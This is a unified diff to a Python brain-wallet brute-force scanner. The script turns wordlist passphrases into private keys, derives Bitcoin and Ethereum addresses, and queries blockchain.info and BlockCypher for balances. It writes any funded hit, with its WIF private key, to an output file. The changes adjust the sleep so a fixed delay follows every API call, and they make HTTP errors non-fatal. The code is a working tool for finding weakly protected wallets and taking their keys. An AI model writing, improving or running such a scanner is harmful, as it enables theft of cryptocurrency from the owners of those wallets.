@@ -1,17 +1,17 @@
 #!/usr/bin/env python3
 """
-brute2.py
+brute2_fixed_sleep.py
 Sequential brute scanner for BTC (legacy P2PKH, nested segwit P2SH, native segwit Bech32)
-PLUS Ethereum checks by default. Exact sleep (seconds) is applied per address check.
+PLUS Ethereum checks by default. Enforces EXACT sleep (args.sleep) after every single API call.
 
 Dependencies:
     pip3 install coincurve requests base58 pycryptodome bech32
 
 Usage:
-    python3 brute2.py --dict dictionary.txt --out found.txt [--no-eth] [--sleep 0.6] [--debug]
+    python3 brute2_fixed_sleep.py --dict dictionary.txt --out found.txt [--no-eth] [--sleep 0.6] [--debug]
 """
 from __future__ import annotations
-import argparse, io, sys, time, logging, hashlib, binascii, random
+import argparse, io, sys, time, logging, hashlib, binascii
 import requests, base58
 from coincurve import PrivateKey
 
@@ -23,7 +23,6 @@ except Exception:
 
 # try to import bech32 functions from common bech32 package
 try:
-    # many bech32 packages expose bech32_encode and convertbits
     from bech32 import bech32_encode, convertbits
     _HAS_BECH32 = True
 except Exception:
@@ -64,14 +63,11 @@ def btc_bech32(pub_bytes: bytes) -> str:
     """Native segwit bc1q... using bech32.convertbits + bech32_encode"""
     if not _HAS_BECH32:
         raise RuntimeError("bech32 library not available (pip install bech32)")
-    # witness program is HASH160(pub) for a P2WPKH (version 0, 20 bytes)
-    witprog = hash160(pub_bytes)
-    # convert from 8-bit to 5-bit groups
-    data = convertbits(witprog, 8, 5, True)
+    witprog = hash160(pub_bytes)            # 20 bytes
+    data = convertbits(witprog, 8, 5, True) # -> 5-bit groups
     if data is None:
         raise RuntimeError("bech32.convertbits failed")
-    # prepend witness version 0
-    data5 = [0] + data
+    data5 = [0] + data                       # witness version 0
     addr = bech32_encode("bc", data5)
     return addr
 
@@ -107,17 +103,27 @@ def eth_address_from_privhex(priv_hex: str) -> str:
     addr_hex = addr_bytes.hex()
     return "0x" + to_checksum_address(addr_hex)
 
-# ---------------- generic numeric fetcher ----------------
+# ---------------- numeric fetcher ----------------
 def _get_raw_numeric(session: requests.Session, url: str, timeout: float = 15.0) -> float:
-    r = session.get(url, timeout=timeout)
-    r.raise_for_status()
+    """
+    Return numeric value parsed from response; returns 0.0 if nothing parseable.
+    This function does NOT sleep — caller must sleep after each call.
+    """
+    try:
+        r = session.get(url, timeout=timeout)
+        r.raise_for_status()
+    except Exception as e:
+        # network / HTTP error -> treat as 0.0 for resilience; caller will still sleep
+        logging.debug("HTTP error for %s: %s", url, e)
+        return 0.0
+
     text = r.text.strip()
     # try direct float
     try:
         return float(text)
     except Exception:
         pass
-    # try JSON fields
+    # try common JSON numeric fields
     try:
         j = r.json()
         for key in ("total_received","totalReceived","final_balance","finalBalance","balance","received","result"):
@@ -131,7 +137,6 @@ def _get_raw_numeric(session: requests.Session, url: str, timeout: float = 15.0)
                         pass
     except Exception:
         pass
-    # if nothing parsed, return 0.0 (no funds) instead of raising to be resilient
     return 0.0
 
 # ---------------- helpers to print/write ----------------
@@ -160,13 +165,12 @@ def main():
     ap = argparse.ArgumentParser(description="Brute sequential scanner: BTC (1,3,bc1q) + ETH (default on).")
     ap.add_argument("--dict", "-d", default="dictionary.txt", help="wordlist (one passphrase per line)")
     ap.add_argument("--out", "-o", default="found.txt", help="append CSV output")
-    ap.add_argument("--sleep", type=float, default=0.6, help="seconds to sleep per address check (default 0.6)")
-    ap.add_argument("--jitter", type=float, default=0.0, help="optional extra jitter added to sleep (default 0.0)")
+    ap.add_argument("--sleep", type=float, default=0.6, help="seconds to sleep AFTER each API call (default 0.6)")
     ap.add_argument("--debug", action="store_true", help="debug logging")
     # ETH default on; provide a --no-eth to disable
     ap.add_argument("--no-eth", dest="eth", action="store_false", help="disable Ethereum checks (ETH checks are ON by default)")
     ap.set_defaults(eth=True)
-    # endpoints (change if you prefer other backends)
+    # endpoints (BTC remains blockchain.info)
     ap.add_argument("--base-received", default="https://blockchain.info/q/getreceivedbyaddress")
     ap.add_argument("--base-balance", default="https://blockchain.info/q/addressbalance")
     ap.add_argument("--base-eth-balance", default="https://api.blockcypher.com/v1/eth/main/addrs")
@@ -230,48 +234,46 @@ def main():
                 except Exception as e:
                     logging.debug("Bech32 derivation error: %s", e)
 
-            # check each BTC address (per-address sleep enforced)
+            # check each BTC address (ENFORCE: sleep AFTER every API call)
             for label, addr in btc_addresses:
                 checked += 1
-                # first try getreceivedbyaddress
-                try:
-                    url = f"{args.base_received}/{addr}"
-                    val = _get_raw_numeric(session, url, timeout=20.0)
-                    if val > 0:
-                        logging.info("Found used BTC address (received) %s %s", label, addr)
-                        print_used_btc(word, label, addr, wif, val, fout)
-                        found += 1
-                    else:
-                        url2 = f"{args.base_balance}/{addr}"
-                        val2 = _get_raw_numeric(session, url2, timeout=20.0)
-                        if val2 > 0:
-                            logging.info("Found used BTC address (balance) %s %s", label, addr)
-                            print_used_btc(word, label, addr, wif, val2, fout)
-                            found += 1
-                except Exception as e:
-                    logging.debug("BTC check error for %s (%s): %s", addr, label, e)
 
-                # sleep exactly args.sleep plus optional jitter
-                sleep_time = args.sleep + (random.random() * args.jitter if args.jitter > 0 else 0.0)
-                time.sleep(sleep_time)
+                # 1) getreceivedbyaddress
+                url_recv = f"{args.base_received}/{addr}"
+                recv_val = _get_raw_numeric(session, url_recv, timeout=20.0)
+                # ALWAYS sleep after the received call
+                time.sleep(args.sleep)
 
-            # ETH check (per address sleep after ETH call)
+                # 2) addressbalance
+                url_bal = f"{args.base_balance}/{addr}"
+                bal_val = _get_raw_numeric(session, url_bal, timeout=20.0)
+                # ALWAYS sleep after the balance call
+                time.sleep(args.sleep)
+
+                # If either endpoint shows >0, report
+                if recv_val > 0 or bal_val > 0:
+                    logging.info("Found used BTC address %s %s (recv=%s bal=%s)", label, addr, recv_val, bal_val)
+                    # choose which value to show (prefer balance if >0)
+                    show_val = bal_val if bal_val > 0 else recv_val
+                    print_used_btc(word, label, addr, wif, show_val, fout)
+                    found += 1
+
+            # ETH check (if enabled). Also enforce sleep AFTER the ETH call.
             if args.eth:
                 try:
                     eth_addr = eth_address_from_privhex(priv_hex)
-                    # BlockCypher style: /v1/eth/main/addrs/{addr}/balance
-                    url = f"{args.base_eth_balance}/{eth_addr}/balance"
-                    eth_val = _get_raw_numeric(session, url, timeout=20.0)
+                    url_eth = f"{args.base_eth_balance}/{eth_addr}/balance"
+                    eth_val = _get_raw_numeric(session, url_eth, timeout=20.0)
+                    # ALWAYS sleep after ETH call
+                    time.sleep(args.sleep)
                     if eth_val > 0:
-                        logging.info("Found used ETH address %s", eth_addr)
+                        logging.info("Found used ETH address %s (wei=%s)", eth_addr, eth_val)
                         print_used_eth(word, eth_addr, eth_val, fout)
                         found += 1
                 except Exception as e:
-                    logging.debug("ETH check error: %s", e)
-
-                # sleep exactly args.sleep plus optional jitter
-                sleep_time = args.sleep + (random.random() * args.jitter if args.jitter > 0 else 0.0)
-                time.sleep(sleep_time)
+                    logging.debug("ETH check error for word '%s': %s", word, e)
+                    # still enforce the sleep even on exception to keep timing constant
+                    time.sleep(args.sleep)
 
             # periodic logging
             if total % 1000 == 0:
